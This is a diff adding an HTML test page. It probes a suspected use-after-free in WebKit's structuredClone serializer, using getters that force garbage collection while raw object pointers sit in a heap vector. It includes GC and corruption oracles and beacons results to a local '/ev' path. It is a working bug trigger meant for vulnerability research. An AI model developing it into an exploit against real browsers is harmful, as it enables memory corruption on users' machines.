@@ -1,0 +1,94 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CloneSerializer::inputObjectStack — a raw JSObject* in a heap Vector across a getter</title>
+<body>
+<script>
+// docs/77. CloneSerializer::serialize walks the value with a plain `Vector<JSObject*, 32> inputObjectStack`
+// (SerializedScriptValue.cpp:2499) — raw pointers, no keep-alive, unlike the map/set iterators which the drop
+// does append to `m_keepAliveBuffer` (:2646/:2668/:2692). Above 32 entries WTF::Vector moves the array to the
+// heap, where the GC cannot see it, and the walk then runs script: `getProperty()` (:1197) goes through
+// `PropertySlot::getValue()`, which calls an own getter.
+//
+// Oracles:
+//   gcprobe  a decoy held only by a WeakRef created in the *previous* job (a WeakRef target is kept alive to the
+//            end of the job that created it, so the decoy has to be older than the clone). `collected` means a GC
+//            really ran inside the serialization window; without this, "no corruption" cannot be told apart from
+//            "no GC".
+//   level    every level declares `level` after `p`, so the serializer reads it on the way back up. A missing
+//            `level` is the serializer's own "property was removed during serialisation" branch: it read a cell
+//            the churn had recycled.
+//
+// One variable per arm: n (depth; <= 32 keeps the vector inline), ref=1 (parent keeps a non-enumerable reference
+// to its child), churn=0 (no allocation in the getters), churnfrom (first depth whose getter churns).
+(function () {
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+  function B(m) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)); } catch (e) {} }
+
+  var N = parseInt(K('n', '40'), 10);
+  var REF = K('ref', '0') === '1';
+  var CHURN = parseInt(K('churn', '1'), 10);
+  var FROM = parseInt(K('churnfrom', String(N - 1)), 10);
+  var MB = parseInt(K('mb', '8'), 10);
+  var OBJS = parseInt(K('objs', '200000'), 10);
+  var DEL = K('del', '0') === '1';   // oracle sensitivity: remove `level` in the window
+  var KEEP = [];
+  var PROBED = 0;
+
+  // job 1: one decoy per churn point, each dropped immediately (a WeakRef target is kept alive only to the end
+  // of the job that created it, so all of them become collectible when job 2 starts)
+  var DECOYS = [];
+  for (var dc = 0; dc < 16; dc++) DECOYS.push((function () { var d = { decoy: dc }; return new WeakRef(d); })());
+  B('boot n=' + N + ' ref=' + REF + ' churn=' + CHURN + ' from=' + FROM + ' mb=' + MB + ' objs=' + OBJS + ' del=' + DEL);
+
+  // job 2: the clone, with the decoy no longer protected by the KeptAlive list
+  setTimeout(function () {
+
+  if (typeof structuredClone !== 'function') { B('no-structuredClone'); return; }
+  B('sc ok');
+
+  function make(depth) {
+    if (depth >= N) return { leaf: 1, level: depth };
+    var o = {};
+    var child = REF ? make(depth + 1) : null;
+    Object.defineProperty(o, 'p', {
+      enumerable: true,
+      configurable: true,
+      get: function () {
+        if (depth >= FROM) {
+          if (CHURN) {
+            for (var i = 0; i < 4; i++) KEEP.push(new ArrayBuffer(MB * 1024 * 1024));
+            for (var j = 0; j < OBJS; j++) KEEP.push({ a: j });
+          }
+          var di = depth - FROM;
+          if (di >= 0 && di < DECOYS.length)
+            B('gcprobe ' + depth + ' ' + (DECOYS[di].deref() ? 'alive' : 'collected'));
+          if (CHURN) B('churn ' + depth + ' ' + KEEP.length);
+        }
+        if (DEL && depth === N - 1) { delete o.level; B('del ' + depth); }
+        return child || make(depth + 1);
+      }
+    });
+    o.level = depth;   // after `p`: read on the way back up
+    return o;
+  }
+
+  var root = make(0);
+  B('built');
+  var out = null;
+  try { out = structuredClone(root); } catch (e) { B('THREW ' + e.name + ':' + e.message); return; }
+  B('done');
+
+  var o = out, k = 0, bad = 0, firstBad = -1, got = '';
+  while (o && typeof o === 'object' && k <= N + 2) {
+    if (o.level !== k) {
+      if (!bad) { firstBad = k; got = String(o.level); }
+      bad++;
+    }
+    if (!('p' in o)) break;
+    o = o.p; k++;
+  }
+  B('verify depth=' + k + ' bad=' + bad + ' first=' + firstBad + ' got=' + got);
+  }, 0);
+})();
+</script>
